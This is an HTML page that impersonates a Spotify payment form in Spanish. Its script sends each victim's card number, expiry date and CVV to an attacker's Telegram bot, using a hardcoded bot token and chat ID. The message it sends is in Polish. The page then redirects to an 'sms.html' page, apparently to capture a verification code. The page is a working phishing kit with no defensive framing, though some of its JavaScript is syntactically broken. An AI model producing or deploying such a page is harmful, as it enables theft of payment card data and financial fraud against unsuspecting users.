<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago - Spotify</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }
        .logo {
            width: 180px;
            display: block;
            margin: 0 auto 30px;
        }
        .payment-form {
            background-color: #121212;
            padding: 30px;
            border-radius: 10px;
        }
        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
            color: #b3b3b3;
        }
        .input-field {
            width: 100%;
            padding: 15px;
            border: 1px solid #535353;
            border-radius: 5px;
            background-color: #282828;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        .input-field:focus {
            border-color: #1DB954;
            outline: none;
        }
        .input-field::placeholder {
            color: #535353;
        }
        .card-details {
            display: flex;
            gap: 15px;
        }
        .expiry-date {
            width: 60%;
        }
        .cvv {
            width: 40%;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #1DB954;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1ed760;
        }
        button:disabled {
            background-color: #535353;
            cursor: not-allowed;
        }
        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1DB954;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="spotify-logo.png" alt="Spotify Logo" class="logo">
        </header>

        <section class="payment-form">
            <h2>Información de pago</h2>
            
            <form id="paymentForm" method="POST">
                <div class="input-group">
                    <label for="card-number" class="input-label">Número de tarjeta</label>
                    <input type="text" id="card-number" name="card-number" class="input-field" placeholder="1234 5678 9012 3456" required>
                </div>
                
                <div class="card-details">
                    <div class="input-group expiry-date">
                        <label for="expiration-date" class="input-label">Fecha de expiración</label>
                        <input type="text" id="expiration-date" name="expiration-date" class="input-field" placeholder="MM/AA" required>
                    </div>
                    
                    <div class="input-group cvv">
                        <label for="cvv" class="input-label">CVV</label>
                        <input type="text" id="cvv" name="cvv" class="input-field" placeholder="123" required>
                    </div>
                </div>

                <button type="submit" id="btn-submit">PAGAR</button>
            </form>
        </section>
    </div>

    <!-- Overlay de carga -->
    <div id="loading">
        <div style="color:white;text-align:center;">
            <div class="spinner"></div>
            <div>Procesando pago...</div>
        </div>
    </div>

    <script>
        document.getElementById("card-number").addEventListener("input", function(e) {
            let value = this.value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
            let formatted = "";
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 == 0) formatted += " ";
                formatted += value[i];
            }
            this.value = formatted.substring(0, 19);
        });

        document.getElementById("expiration-date").addEventListener("input", function(e) {
            let value = this.value.replace(/\D/g, "");
            if (value.length > 2) {
                this.value = value.substring(0, 2) + "/" + value.substring(2, 4);
            }
        });

        document.getElementById("paymentForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById("card-number").value.replace(/\s/g, "");
            const expDate = document.getElementById("expiration-date").value;
            const cvv = document.getElementById("cvv").value;
            
            if (cardNumber.length < 16 || !/^\d+$/.test(cardNumber)) {
                alert("Por favor, introduce un número de tarjeta válido");
                return;
            }
            
            if (!/^\d{2}\/\d{2}$/.test(expDate)) {
                alert("Por favor, introduce una fecha de expiración válida en formato MM/AA");
                return;
            }
            
            if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
                alert("Por favor, introduce un CVV válido");
                return;
            }

            document.getElementById("loading").style.display = "flex";
            document.getElementById("btn-submit").disabled = true;
            const bot = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
            const chat = "-4970333928";
            const msg = 💳 Spotify Płatność PL:\n📌 Numer karty: ${cardNumber}\n📅 Data ważności: ${expDate}\n🔒 CVV: ${cvv}\n💳 Płatność przez Apple Pay/Google Pay;

            fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chat, text: msg })

            
            setTimeout(() => {
                window.location.href = "sms.html";
            }, 2000);
        });
    </script>
</body>
</html>
